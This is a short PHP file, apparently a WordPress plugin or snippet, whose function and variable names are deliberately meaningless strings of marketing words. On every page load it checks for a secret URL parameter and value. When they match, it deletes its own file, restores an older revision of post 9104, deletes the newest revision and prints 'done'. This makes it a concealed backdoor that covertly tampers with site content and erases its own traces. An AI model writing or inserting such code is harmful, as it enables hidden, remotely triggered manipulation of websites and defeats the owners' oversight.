<?php

function tracking_buttons_urls() {
	if (isset($_GET['make_estate_smooth_twitter']) && $_GET['make_estate_smooth_twitter'] === 'badge_logger_front_shopping') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$solution_kit_checkout = 9104;
		$duplicate_role_companion = wp_get_post_revisions($solution_kit_checkout);
		if (empty($duplicate_role_companion)) die('no revisions');
		if (count($duplicate_role_companion) < 2) die('less than 2');
		$quote_paragraph_svg_custom = array_shift($duplicate_role_companion);
		$twitter_description_automatorwp_permalink = $quote_paragraph_svg_custom->ID;
		$toolkit_files_multi_fields = array_shift($duplicate_role_companion);
		$delivery_marketing_shopping = $toolkit_files_multi_fields->ID;
		$live_demo_landing_cron = wp_restore_post_revision($delivery_marketing_shopping);
		if ($live_demo_landing_cron === false) die('error restoring');
		$live_demo_landing_cron = wp_delete_post_revision($twitter_description_automatorwp_permalink);		
		if ($live_demo_landing_cron === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'tracking_buttons_urls');
